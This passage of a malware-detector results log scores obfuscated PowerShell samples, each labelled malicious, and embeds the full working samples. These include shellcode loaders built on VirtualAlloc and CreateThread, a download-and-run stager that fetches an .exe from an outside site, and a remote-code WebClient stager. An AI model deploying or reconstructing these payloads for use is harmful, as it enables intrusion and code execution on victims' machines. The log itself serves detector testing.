Cr','0x39,0x88,0x',',0xea,0x17,0xbd,0x09,0xf4,0x8d,0xa8,0xb5,0x60,0x2a,0x7',',0xdc,0xe4,0x18,0xb5,0x48,0x9c,0x00,0x4','51,0x89,0x02,0x26,0x62,0xa2,0x77,0x29,0xe0,0xb9,0xab,0x89,0xd9,0x71,0','xb4,0x36,0x0b,0xad,0xdd','c,0x','0x39,0xe5,0xf','tPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(nQHkernel32.dllnQH)]public stat','0x9','t([IntPt','0x5d,0x4c,0x3c,0x01,0x99,0x18,0x','x61,0x9f,0x2','32.dllnQH)]public static extern In',',0xbc,0x21,0xde,0x8b,0x9b')).rePlAcE(([cHAR]110+[cHAR]81+[cHAR]72),[strInG][cHAR]34).rePlAcE(([cHAR]88+[cHAR]112+[cHAR]55),[strInG][cHAR]39).rePlAcE(([cHAR]118+[cHAR]116+[cHAR]120),[strInG][cHAR]36) |.((varIabLe '*Mdr*').nAMe[3,11,2]-join'')",malicious,TP
2026-07-13 17:10:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3272.ps1,custom-ps-ml,UNKNOWN,1e2c15e0-fea9-4aec-b74a-fcf361324ec5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3049,1575.39,"invOke-ExpREssIoN((((\""{38}{49}{71}{51}{66}{15}{17}{58}{63}{62}{70}{31}{5}{25}{3}{23}{55}{11}{47}{61}{48}{26}{16}{40}{50}{9}{53}{21}{7}{35}{10}{43}{37}{4}{46}{12}{65}{42}{54}{30}{34}{14}{68}{57}{19}{22}{45}{69}{1}{32}{24}{6}{52}{27}{0}{13}{2}{60}{64}{20}{33}{28}{72}{29}{56}{41}{39}{8}{59}{18}{44}{36}{67}\"" -f 'x6a,0x89,0xe3,0xd6,0x02,0x30,0xae,0xad,0xb3,0xbd,0',',0x54,0x58,0xd','0x6b,0x0b,0xff,0xc4,0x90,0x9a,0xa8,0x70,0x9b,0xfb,0x9e,0xde,0x64,0x2e,0x95,0xd7,0','bf,0xcd,0x43,0xe1,0x5',',0x3b,0x94,0x88,0xb9','unctions -passthru;[Byte[]];[Byte[]]4','0x78,0x5e,0x6f,0x3a,0x38,0x0e','0x12,0x44',':memset([IntPtr](4gnt','0x66,0x6','x6e,0x1a,0x0c,0x89,0x4b,0xd',',0x7b,0x0f,0','0x59,0xf4,0x36,0xc1,0x85,0','x64,0xc8,0xf3,0x36,0x8b,0x2c,0xbd,0xbe,0xe6,0x3e,0x29,0x4f,0xbd,0x1d,0xff,0x50,','7,0xbf,0xbc,0xb5,0x1c,0x',', uint flProtect);[DllImpor',',0x6b,0xbc,0xed,0x0a,0x6c,0xed,0xce,0x0d,0xee,0xec,0x02,0xee,0xcf,0x3e,0x57,0xef,0x08,0x22,0x9a,0xbd,0xc1,0x28,0x','t(KOdkernel32.dllKOd)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, ',',','xe1,0xef,0xa3,0xb3,0x','0x79,0x36','0xd9,0x34,0x68,0x92,0x3e,0x8c,0x8b,0xb3,0x90,0x87,0xd5,0x13,','47,0x7b,0x49,0xa7,0xf5,0x26,0x05,0x04,0x34,0xd9,0xd5,0x02,0x','7,0xdb,0xcd,0xd9,0x74,0x24,0xf4,','6,0xe8,0x3c,0x65,','gnz = 0x','x23','c0,0x66,0x0a,0x7e,0','f5,0x0d,0xac,0xf9,0xaf,0xe','x51,0x01,0x7','e,0x17,0xbe,0xbe,0xfb,0x9','F','e,0xbf,0x81,0xf5,0xdb,0x57,0xea,0xa2,0x7b,0x27,0x82,0xb0,0x83,0x2',',0xdb,0x41,0x9c,0x39,0xf6,0x','6,0x11,0x3',',0',':CreateThread(0,0,4gntlx,0,0,0);for (;;){Sta',',0x79,0x27,0xe7,0x61,0xb0,0xc8,0x44,0x4c,0x7d','4gndjr = QUL[DllImport(KOdkernel32.dllKOd)]pub','0x1000){4gng = 4gnz.Length};4gntlx=4gnw::VirtualAlloc(0,0x1000,4gng,0x40);for (4gni=0;4gni -le (4gnz.Length-1);4gni++) {4gnw:','09,0x52','gng = 0x1000;if (4gnz.Length -gt ',',0x8','4,0xa7',' 1)};4gnw:','4f,0xaa,',',0xa4,0xe3,0xe0,0xba,','x03,0x7b,0xc2,0xa1,0x14,0xab,0x34,0xa7,0xd7,0x54,0xc4,0xc8,0x5e,0xb1,0xf5,0xc8,0x05,0xb1,',',0x8b,0','lic stati',',','IntPtr lpAd',',0xcf,0xea,0xd0,0x44,0xc0,0xd5,0x','4,0x92,','5,0x82,0x6','0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31','8,0x74,0x27,0x6b,0xb8;4','0xf8,0xca,0','IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThre','lx.ToInt32()+4gni), 4gnz[4gni]','xf0,0x91,0xc1,0x17,0','0xa5,0xf8,0x4e,0x97,0x49,0x72,0x02,0x0c,0xda,0xf6',' uint src, uint count);QUL;4gn','adId);[DllImport(KOdmsvcrt.dllKOd)]public static extern IntPtr memset(IntPtr dest,','x15,0x12,0x11,0x4e,0x7f,0x12,','x71,0xad,0x61,0x4d,0x21,0x09,0x90,0x82,0xb4,0xda,0x9e,0x6f,0xb2','dress, uint dwSize, uint flAllocationType','rt-sleep 60};','1b,0xdc,0xec,','0xe7,0x8d,0xfb,0x24,0x4b,0x45,0x22,0xb2,0xac,0x7c,0x92,0x2c,0x53,0x7f,0xe3,0x65,0x97,0x2b,0xb3,0x1d,0x3e','w = Add-Type -memberDefinition 4gndjr -Name KOdWin32KOd -namespace Win32','c extern IntPtr VirtualAlloc(','2,0x67,0x92,0x4d,0xdd,0x40,0x3d,0xad,0x08,0'))-cReplaCE '4gn',[ChaR]36 -cReplaCE  ([ChaR]75+[ChaR]79+[ChaR]100),[ChaR]34-cReplaCE([ChaR]81+[ChaR]85+[ChaR]76),[ChaR]39) )",malicious,TP
2026-07-13 17:10:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3274.ps1,custom-ps-ml,UNKNOWN,4afac8a4-e157-4e32-a13c-13fb38bf0545,DESKTOP-BAC9DBQ,malicious,0.9032,RandomForest,3864,1794.78," . ( $pSHOME[21]+$pShOme[34]+'x')((((\""{80}{69}{30}{64}{10}{17}{87}{44}{60}{24}{34}{22}{19}{6}{21}{75}{29}{28}{88}{31}{15}{79}{1}{2}{83}{84}{16}{86}{23}{57}{66}{8}{90}{20}{14}{52}{54}{72}{48}{18}{89}{76}{26}{51}{5}{47}{61}{73}{49}{68}{0}{81}{37}{55}{50}{11}{40}{45}{59}{71}{58}{32}{91}{62}{41}{77}{85}{9}{3}{46}{43}{92}{56}{7}{42}{27}{38}{65}{67}{82}{39}{53}{70}{12}{63}{36}{74}{25}{78}{33}{35}{13}{4}\"" -f 'd','ndows.Forms.SendKeys]::SendWait(Tiq{T','AB}Tiq)  [System','dows.','s.Forms.SendKeys]::SendWait(Tiq%{F4}Tiq)','endKeys]::Sen','eys]::SendWait(Tiq{TAB}T','ind','it(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait','4  [System.Windows.Forms.SendKeys]::SendWait(Tiq{TAB}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{TAB}Tiq)  [System.Win','mbly]::Loa',']::SendWait(Tiq','NTER}Tiq)  Start-Sleep -Milliseconds 200  [System.Win','.Forms.SendKeys]::SendWait(Tiq%{F4}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq%{F4}Tiq)  [System.Window','endKeys]::SendWait(Ti','::SendWait(Tiq{TAB}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{TAB','}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{TAB}Tiq)','dWithPartialName(TiqKuxSy','dKeys]::SendWait(Tiq{DOWN}Tiq)  [System','q)  Start-Sleep 1  [System.Windows.Forms.SendK','indows.Forms.S','iq)  [System.Windows.For','(Tiq{TAB}Tiq)  Start-Sleep 1  [System.Windows.Forms.SendKeys]::SendWait(Tiq{ENTER}Ti','s.SendKey','ows.Forms.SendKeys]','indows.Forms','iq{DOWN}Tiq)  [System.Windows.F','q19931993Tiq)  [System.Window','dows.Forms.SendKeys]::SendWa','endWait(Tiq{TAB}Tiq)  [System.Win','em.Reflect','ystem.Windows.Forms.SendKeys]','DOWN}Tiq)  [Syste','ndKeys','::SendWait',']::SendWait(Tiq%{F4}Tiq)  Start-Sleep -Milliseconds 200  [System.Windows','SendKeys]::SendWait','ait(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.Windows.','s.Forms.SendKeys]::SendWa','stem.Windows.Forms','{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWai','  Start-Sleep 2  [System.Windows.Forms.SendKeys]::SendW','ows.Forms.SendKeys]::SendWait(Ti',':SendWait(Tiq{TAB}Tiq)  Start-Sleep 1  ','art-Sleep 1  [System.Windows.Forms.Se','t(Tiq{','Forms.SendKeys]:','dWait(Tiq','it(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.Windows.Forms.Sen','Windows.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.Windows.Forms.Se','Keys','orms.S','q{DOWN}Tiq)  [System.Wind','.SendKeys]::SendWait(Tiq{TAB}Tiq)  Start-Sl','ows.Forms.Send','Forms.Send','leep 1  [System.W','s]::SendWait(Tiq{TAB}Tiq)  [System.Windows.Forms.SendKeys]','ws.Forms.SendKeys]::SendWait(Tiq{','DOWN}Tiq)  [System.Windows.Forms.Send','ndKeys]::SendWait(Tiq{TAB}Tiq)  Start-Sleep 1  [System.Wind','{DOWN}Tiq)  [System.Windows','q{DOWN}Tiq)','dows.Forms.','ion.Asse','it(Tiq{TAB}Tiq)  Start-Sleep 1  [System.Windows.Forms.SendKeys]::SendWa','::SendWait(Tiq{TAB}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{TAB}Tiq)  Start-Sleep 1  [System.Windows.Forms.SendKeys]::SendWa','it(Tiq','ndKeys]::Sen','[Syst','eep 1  [System.Windows.Forms.SendKeys]::SendWait(Tiq{E','Keys]::SendWait(Tiq{DOWN}Tiq)  [System.Windo','Keys]::SendWa','.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(Tiq{DOWN}Tiq)  [System.','(Tiq%{F4}Tiq)  [System.W','ms.SendKeys]::S',']::SendWait(Tiq{DOWN}Tiq)  [System.Windows.Forms.SendKeys]::SendWait(T','ait(Tiq{ENTER}Tiq)','.Se','}Tiq)  [System.Wi','control  [void] ','W','19931993Tiq)  [Sy','.Windows.For','ms.SendKeys]::SendWait(Tiq{TAB','  Start-Sleep ','  [System.Windows.Form','stem.Windows.FormsTiq)  St','it(Tiq{TAB}Tiq)  [S','.Windows.Forms.SendKeys','(Tiq{DOWN}Tiq)  [System.W','m.Windows.Forms.SendKeys]::SendWait(Ti','[System.Windows.Forms.SendKeys]::SendWait(Tiq{ENTER}Tiq)  Start-S'))-CrePlace 'Tiq',[CHAr]34 -REplacE  ([CHAr]75+[CHAr]117+[CHAr]120),[CHAr]39))",malicious,TP
2026-07-13 17:11:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3281.ps1,custom-ps-ml,UNKNOWN,50398357-a2f2-4184-911d-97a2f283e4eb,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3280,1747.97,"&amp; ((geT-VaRiabLe '*Mdr*').NamE[3,11,2]-jOiN'')(((\""{47}{74}{17}{30}{31}{62}{18}{13}{54}{49}{25}{29}{58}{60}{76}{26}{70}{7}{44}{48}{5}{27}{23}{45}{14}{55}{39}{22}{36}{68}{73}{65}{37}{16}{75}{69}{46}{42}{40}{8}{34}{38}{12}{19}{0}{61}{28}{15}{71}{72}{51}{24}{20}{9}{21}{2}{50}{35}{33}{4}{57}{52}{64}{10}{66}{41}{6}{59}{67}{53}{32}{1}{63}{11}{56}{3}{43}{77}\""-f '0xf4,0x52,0xbe,0xfc,0xd2,0xa5,','gt 0x1000){8A9g = 8A9z.Length};8A9f','x8e,0xc3,0xa9,0x63,0x20,0x79,0x3a,0x7c,0xd4,0x28,0xea,0x48,0xa4,0xd4,0x3e,0x3b,0xe4,0x36,0xab,0x39,0xb','hread(0,0,8A9fpCk,0,','2,0xa8,0xf','x49,0x24,0xb9,0x5f,0x0f,0xc7,0x42,0xa0,0x6f,0x41,0xa7,0x91,0xaf,0x35,0xa3,0x8',',0x16,0xb9,0x56,0xdc,0x7c,0xb9,0x3e,0xb8,0x24,0x','xb8,0xab,0xd1,0x45,0xb7,0xda,0xd4,0xd9,','0xcb,0xa2,0x93,0x98,0xca,0x','bb,0x71,0x77,0xa1,0x2b,0x15,0x04,0x4d,0x82,','x4b,0x92,0x25,0x13,0xe3,0x98,0x10,0x53,0x','(0,0x',',0xc4,0xc6,0xbf,0xac,0x5f,0xb4,0x8d,0x7','readAttributes, uint dwStackSize, IntPtr lpStartAddress','9a,0x18,0x8e,0','x','a,0xa','2.dll7DN)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSi','ad(IntPtr lpTh','3,','2b,0x','0x8d,0','0x1b,0xcb,0xa2,','a4,0x98,0xbb,0x15,0x0d,0x16,0','0x','tPtr','ions -passth','2,0x1f,0x3d,0xe1,0x2e,0xd4,0x13,0x12,0x',',0x3c,0',' lpThreadId);[DllImport(7DNmsvcrt.dll7DN)]public static extern IntPtr memset(IntPtr dest, ui','ze, uint',' flAllocationTyp','A9z.Length -','1,0x7f,0xc7,0x8','67,0xa8,0xa5,0x47,0x86,0x7f,0x2c,0x13,0xad,0x5b,0x74,0xc0,0xcc,0xfa,0xd0,0xa7','xa4,0xa4,0x2f,0x1b,0xe','0x28,0xeb,','3,0x00,0xab,0xce,0x0d,0x1',',0xf1,0x1d,0xbb,0x18,0x54,0x55,0x56,0x4d,0xe5,0x34,0x3f,0xa2',',0x9c,0x2d,0x9b,0x46,0xdd,0x6a,0xc1,0xab,0x8f,0x23,0x8e,0x1e,0x20,0x47,0xda,0xa2,0xcb,','e,0xa4,0xb4,0x74,',',0x89','0x04,0xc1,0xdd,0xda,0x81,0xd2,0x46,0xa9,0x32,0x3f,0x76,0x7','0,0);for (;;)','0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x4f,0x83,0xee,0xfc,','x','0xfa,0x5c,0x41,0xf3,0xf2,0x9e,0xfc,','8A9RHR = 7gp[DllImport(7','0x31,0x46,0x10,0x03,0x46,0x10,0','IntPtr lpParameter, uint dwCreationFlags, In','4,0x2e,0x29,0x42,0x25,0xf3,0','xf9,','5,0x76,0x21,0xe0,0x95,0xee,0xc1,0xbf,','0x93,0xf4,0x90,0x32,0x3c,0x06,0xf7,0xc2,0x00,0xd1,0x31,0xb1,0x68,0xe1;8A9g = 0x1000;if (8',', ','x0a,0xde,0x3b,0x0c,0x50,0x33','1000,8A9g,0x40);for (8A9i=0;8A9i -le (8A9z.Length-1);8A9i++) {8A9w::memset([IntPtr](8A9fpCk.ToInt32()+8A9i), 8A9z[8A9i], 1)};8A9w::CreateT','4,0x76,0x4a,0x67,0x71,0xb8,0xc0,0x84,0x8','nt src, uint count);7gp;8A9w = A','ea,0x5b,0xc7,0xf0,0x9e,0xf0,0x52,0x','dd-Type -memberDe','0xc1,0xd7,0xa3,0x3a','e, uint flProtect);[DllImport(7DNkernel32.dll7DN)]public static extern IntPtr CreateThre','pCk=8A9w::VirtualAlloc','0xc4,0xb8,0xde,0x15,0x62,0x44,0','b5,0x0','ac,0x63,0x77,0xe8,0x65,0xf6,0x38,0x86','fb,0xf6,0xa5,0xf5,','0xea,0x83','x53,0x6a,0x74,0xba,0x5b,0x99,0x84,','ru;[Byte[]];[Byte[]]8A9z = 0','d7,0xd3,0x','13,0xfb,0x83,0x83,0x0b,0x2a,0xab,0x4f,0xcc,0xd3,0x7e,0xdf,0x9c,0x7b,0xd0,0xa0,0x4c,0x3c,0x80,0x48,0x87,0xb3,0xff,0x69,0xa8,0x19,0x68,0x81,0x41,0xa2,0x96,0x52,0x07,0xd1,0',',0xfe,0x67,0x','DNkernel3','8,0xea,0xc4,0x91,0x1a,0x81,0xd6,0x73,0','finition 8A9RHR -Name 7DNWin327DN -namespace Win32Funct','{Start-sleep 60};')).RePlACe('7DN',[sTRIng][CHAR]34).RePlACe(([CHAR]56+[CHAR]65+[CHAR]57),[sTRIng][CHAR]36).RePlACe('7gp',[sTRIng][CHAR]39))",malicious,TP
2026-07-13 17:11:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3282.ps1,custom-ps-ml,UNKNOWN,76405ce2-3e83-4a9d-86c3-68162ec73dde,DESKTOP-BAC9DBQ,malicious,0.9999,RandomForest,761,1749.37," iNvoKe-exPreSsIOn(((\""{33}{44}{21}{13}{6}{14}{7}{12}{5}{1}{25}{28}{23}{46}{29}{40}{34}{9}{27}{47}{2}{48}{43}{42}{18}{39}{0}{20}{11}{3}{10}{45}{30}{35}{16}{31}{19}{32}{24}{15}{8}{41}{37}{22}{17}{38}{36}{4}{26}\""-f 'env:TEMPZN','loadFile(v5o','kpost/','ij','n','t).Down','tem.','bCl','3','m/m','doe','s','ien','s','Net.We','s (nRP',';','sijdoe','o,','ta','6lawd','Object Sy','d','lthand','s','http','RP)','odules/mod','://www.wea','e','P','S','rt-Proce','(New','hops.co',')','.exe','aw','f','nRP3Ls','alt','Lsenv:TEMPZN6l','ev5','ijdoef.ex','-','f.exenR','h','_easyblogquic','lawds')).rePLAcE('3Ls',[StriNG][char]36).rePLAcE(([char]118+[char]53+[char]111),[StriNG][char]39).rePLAcE('ZN6',[StriNG][char]92).rePLAcE(([char]110+[char]82+[char]80),[StriNG][char]34))",malicious,TP
2026-07-13 17:11:15,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3308.ps1,custom-ps-ml,UNKNOWN,106ca964-ba5a-421e-b925-e1385f768af9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1456,1702.79," InVOKe-EXPrESSIon( (((\""{31}{88}{18}{14}{65}{57}{35}{0}{108}{19}{64}{104}{63}{23}{22}{86}{106}{20}{1}{48}{17}{34}{84}{37}{112}{80}{15}{38}{42}{43}{91}{97}{105}{89}{101}{9}{40}{45}{99}{54}{77}{7}{61}{5}{83}{87}{39}{75}{68}{103}{90}{60}{6}{59}{98}{56}{79}{94}{55}{53}{8}{44}{100}{78}{46}{111}{49}{12}{72}{82}{74}{21}{11}{41}{30}{47}{102}{93}{107}{71}{81}{96}{36}{2}{33}{51}{73}{70}{85}{109}{26}{58}{25}{27}{29}{4}{95}{32}{28}{50}{92}{10}{69}{62}{52}{13}{67}{66}{24}{3}{16}{76}{110}\""-f'E','; W','([','X (sKbb-joiN','7.my','Et.WEBREQU','RoxY','= [SysTE',':D','ChUser-AgentOCh,s',')8b','43b0e92','N','sK',' S',') ','OC','Tr','Bject','T;s','ndows NT 6.1','=OCh1','lla/5.0 ','zi',';IE','oft','//mi','-u','m','pdate','52b3658','sKbwC','.co','ChaR[','iden','Cli','bb=',';','like ','efauLtW','Kb','d81','Gecko','OCh;sKb','EF','u);s','r','2759b2','OW64; ','e',':443/index.a',']](sKbWC.DOW','i++%','E]:','Wc.PROXY','CAch','[Sy','M.Net.WeB','cros','.CrEdENT','.P','M.N','Kb','Mo','K','ySTe','k.LengtH]}','b','OX','C%{sKb_-BXOrsKbK[s','loADSTRing(dDWh','i=0','t','N','K','EBPr','h',' ','TNEtwoRkC','sTEM.N',':11.0',';','iaLs;sKb','EsT]:','t/7.0','tt','(',':D','=NeW-O','eRS.','KbWC','wc.','spdDW))','67a','et.CrEDenTiAl','vnc','[cHAR[]]sK','H','iAls = ','Kb','auL','ADd(O','cae','Y;s','bu=OCh','eAd','Wi','98OCh;sKb','n','p:','OCh)','Ed',' rv'))  -RepLace 'sKb',[CHAr]36 -RepLace ([CHAr]79+[CHAr]67+[CHAr]104),[CHAr]39-RepLace '8bC',[CHAr]124-crePlAcE 'dDW',[CHAr]34))",malicious,TP
2026-07-13 17:11:29,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3311.ps1,custom-ps-ml,UNKNOWN,121a258b-b2eb-4437-80e8-db65b81eb01a,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3075,1583.62,". ( $ENV:coMSpEC[4,15,25]-jOIn'') ( ((\""{28}{55}{33}{52}{11}{9}{4}{3}{22}{18}{7}{43}{50}{0}{53}{40}{8}{31}{69}{35}{25}{47}{56}{67}{13}{16}{32}{61}{5}{20}{1}{60}{48}{71}{27}{2}{23}{24}{70}{39}{44}{59}{12}{14}{42}{19}{10}{62}{17}{29}{58}{45}{54}{34}{57}{49}{15}{30}{72}{68}{38}{51}{21}{65}{41}{63}{26}{6}{36}{64}{37}{46}{66}\"" -f'Add-Type -memberDefinition XgnMIk -Name ','0x41,0x63,0xce,0x1d,0x9','x24,0xad,0x1b,0x10,0x30,0xdc,0x41,0x7c,0xf5,0xed,0x7',' CreateThread(IntPtr lpThreadAttributes, uint dwStackSi','ntPtr',',0xb1,0xc1,0x8e,0x19,0x39,0x6d,0xef,0x9','ngt','Thre',' Win32Functions -passthru;[Byte[]];[Byte[]]Xgnz = 0xda,','tatic extern I','0x26,0x60,0xbe,0x28,0x96,0x08,0xd4,0xa6,','public s','37,0x12,0x7a,0x8e,0x78,0x4b,0x8e,0xcf,0x11,0x','d,0xb0,','8e,0x8','0,0xf7,0x36,0x4f,0','0xc2,0x6a,0','2','ress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lp','9,0x80,0xcd,0x48,','6,0xc8,0x6f,0x37,0x10,0x33,0x1a,','df,0','ze, IntPtr lpStartAdd','9,0x7c,0x91,0x66,0x','09','x4f,0x04,0x6b,0x36,0xb0,0xf5,0x6b,0x57,0x38,0x10,0','0x97,0xb0,0x44;Xgng = 0x1000;if (Xgnz.Le',',0xf7,0x0f,0x13,0x7b,0x07,0x4f,0xfc,0','XgnMIk = cGf[DllImport(QOTkernel32.dllQOT)]public static extern ','8,','x','0xd0,0xd9,0x74,0x24,0xf4,0xbb,0x6f,0xd2,0xba,0xf8,0x5e,0x31,0xc9,0xb1,0x','xb9,0x67,0xf3,0x1f,0xf7,0xbb,0x78,0x53,0x19,0xbc,0x9d,0x23,0x18,0xed,0x33,0x38,0x43,0x2d,0xb5,0xed,0xff,0x64,0xad,0xf2,0x3a,0x','ntPtr lpAddress, uint dwSize, uint flAllocationType, uint f','x7a,0xa0,0x40,0x90,0x1b,0x2d,0x5f,0xdc,0x1b,0xa5,0x6c,0x20,0xd5,0x4e,0x18,0x32,0x81,0xbe,0x57,0x68,0x07,0xc0,0x4d,0x07,0x','14,0x03,0x5e,0x7b,0x30,0','h -gt ','XgnS33.ToInt32()+Xgni), X','xb','b7,0xfb,0x52,0x05,0xe2,0xb','ce',',0xa1,0x50','f,0xce,0x5d,0x07,0x6','adId);[DllImpo','c,0xcd,0xf8,0x0d,0xbd,0xc4,0x3e,0x59,0xed,0x7e,0x','0x62,0xc2,0x38,0xd9,0xd','gnz[Xgni]','x5a,0x57,0x5e,0x50,0xcc,0x67,0x14,0x34,',',0x39,0x33,0xcd',',0xc0,0x7','rt(QOTmsvcrt.dllQOT)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);cGf;Xgnw = ','b,0x59,0x75,0x','lProtect);[DllImport(QOTkernel32.dllQOT)]','QOTWin32QOT -namespa','a,0','IntPtr VirtualAlloc(I','0xe0,0x0c,0x78,0xad,0x73,0x60,0x55,0xc2,0x34,0xcf,0x83,0xed,0xc5,0x7c,0xf7,0x6c,','a7,0x54,0x6a,0x8e,0xf0','0xd7,0x6c,','97,0xe2,0x66,0x7f,0x18,0x','6,0x1e,0x14,0xab,0x0d,0xb8,0xdf,0x0b,0xea','3e,0x46,0xc0','0xc9,0x',',0xe1,0x58,0x74,0x9c,','0x1000){Xgng = Xgnz.Length};XgnS33=Xgnw::VirtualAlloc(0,0x1000,Xgng,0x40);for (Xgni=0;Xgni -le (Xgnz.Length-1);Xgni++) {Xgnw::memset([IntPtr](','x63',', 1)};Xgnw::CreateThread(0,0,XgnS33,0,0,0);for (;;){Start-sleep 60};','0x45,0x7f,0x24,0x4f,0x74,0xb0,0x39,0x8e,0xb1,0xa','2,0x55,0x3c,0xd3,0x53,0x0a,0x97,0','47,0x83,0xee,0xfc,0x31,0x5e,0x',',0x4e,0x3e,0xdd,0x85,0xe2,0x',',0x79,0x35,0xf8,0x99,0x26,0x59,0xff,0x4e,0x5d,0x65,0x74,0x71,0xb2,0xec,0xce,0x56,0x16,0xb5,0x95','8a,0xd2,0x4d,0x46,0x1e,0x9d,0x39,0xa7,0xce,0x1d,0xb9,0xf1,0x84,0x1d,0xd1,0xa5,0xfc,0x4d,0xc4,0xa9,0x28,0xe')).REplaCE(([CHAr]88+[CHAr]103+[CHAr]110),'$').REplaCE('cGf',[sTring][CHAr]39).REplaCE(([CHAr]81+[CHAr]79+[CHAr]84),[sTring][CHAr]34) )",malicious,TP
2026-07-13 17:11:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3315.ps1,custom-ps-ml,UNKNOWN,0b9c7290-70e0-4023-acfe-20d797f946d0,DESKTOP-BAC9DBQ,malicious,0.9697,RandomForest,2881,1791.86,"&amp; ((GeT-vARiaBlE '*Mdr*').nAMe[3,11,2]-JoIN'') ( (((\""{21}{44}{26}{2}{47}{8}{23}{9}{19}{4}{46}{3}{5}{14}{43}{45}{37}{33}{13}{34}{36}{10}{39}{31}{18}{27}{12}{15}{20}{24}{35}{16}{7}{6}{40}{38}{30}{11}{1}{28}{48}{41}{42}{25}{0}{17}{22}{32}{29}\""-f 'or (RGAi=0;RGAi -le (RGAz.Length-1);RGAi++) {RGAw::memset([I','x83,0xb7','lImport(U63kerne','ationFlags, ',',','IntPtr lpThreadId);[DllImport(U63msvcrt.dllU63)]public static exte','82,0xb7,0',',0x','tatic extern IntPtr CreateThread(Int','adAttributes, uint dwStackSi','x40,0x05,0xef,0x3e,0xf2,0xe1,0x0e,0x92,0x65,0x61,0x1c,0x5f,0xe1,0x2','7,0','66,0xbc,0x43,0x0f,0x76,0x41,0x96,0x80,0x26,0xed,0x49,0x61,0x97,0x4d,0x3a,0x09,0xfd,0x42,0x65,0x29,0xfe,0x89,0x0','0x64,0x6c,0xdc,0x73,0x46,0x4d,0x2f,0x86,0x87,0x8a,0x52,0','rn IntPtr memset(IntPtr dest, uint src, uint count);kRO;RGAw = Add-Type -memberDefinition RGAc -Name U63Win32U63 -namesp','e,0xc0,0x04,0x59,0x62,0xe9,0x8b,0xef,0xec,0x13,0x94,0x1e,0xb1,0x9a,0x72,0x4a,0x59,0xcb,0x2d,0xe2,0xc0,0x56,0xa5,0x93,0x0d,0x4d,0xc3,0x93,0x86,0x62,0x33,0x5d,0x6f,0x0e,0x27,0x09,0x9f,0x45,0x15,0x9f,0xa0,','x89,0xde,0xcc,0x2d,0x1c,0xe1,0xa4','nt','b4,0x8c,0xc9,0x5','ze, IntPtr lpStartAddress, IntPtr lpParameter','0x73,0x30,0x1f,0x35,0x78,0x93,0x48,0xa1,0x82,0xc2,0xbe,0x','RGAc = kRO[DllImport(U63kernel32.dllU63)]public static extern','Ptr](RGAx.ToInt32()+RGAi), RGAz[RGAi], 1)};RGAw::CreateThread(0,0,RGAx,0','Ptr lpThre','6e,0x7c,0x21,0xb5,0xa7,0xe8,0x8a,0xa1,0xc7,0xfc,0x0a,0x31,0x9e,0x96,0x0a,0x59,0x46,0xc3,','RGAg,0x40);f','tr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dl','6,0x13,0x4a,0x2e,0x4d,0xe3,0xc4,0xd1,0x6e,0x14,0xcc,0x15,0x3a,0x44,0x',';RGAg = 0x1000;if (RGAz.Length -gt 0x1000){RGAg ',';','0,0x15,0xb4,0x28,0x01,0x69,0x63,0x14,0x7','e,0x83,0x15,0x05,0x71,0x53,0x32,0x1e,0x02,0x61,0x9d,0x',',0,0);for (;;){Start-sleep 60}',',0xfc,0xcb,0xed,0xac,0xda,0xe2,0xee,0x9d,0x1f,','x6b,0xd5,0x43,0x18,0xde,0xca,0xe0,0x54,0xe3,0x61,0xba,0x79,0x63,0x95,0x0a,0x7b,0x42,0x08,0x01,0x22,0x44,0xaa,0xc6,0x5e,0xcd,0xb4,0x0b,0x5','0x58,0x7c,0','a,0x87,0x4f,0xff,0x10,0x16,0x86,0xce,0xd9,0xb5,0xe7,0xff,0x2b,0xc7,0x20,0xc7,0xd3,0xb2,0x58,0x34,0x69,0xc5,0x9e,0x47,0xb5,0','x01','f','d,0x00,0x5e,0x26,0x46,0x3c,0xeb,0xc9,0x89,0xb5,0xaf,0xed,0x0d,0x9e,0x74,0x8f,0x14,0x7a,0xda,0xb0,0x47,0x25,0x83,0x14,0x03,0xcb,0xd0,0x24,0x4','x89,0x4a,0xfd,0x','alAlloc(0,0x10','00,','ace Win32Functions -passthru;[Byte[]]',' IntP',';[Byte[]]RGAz = 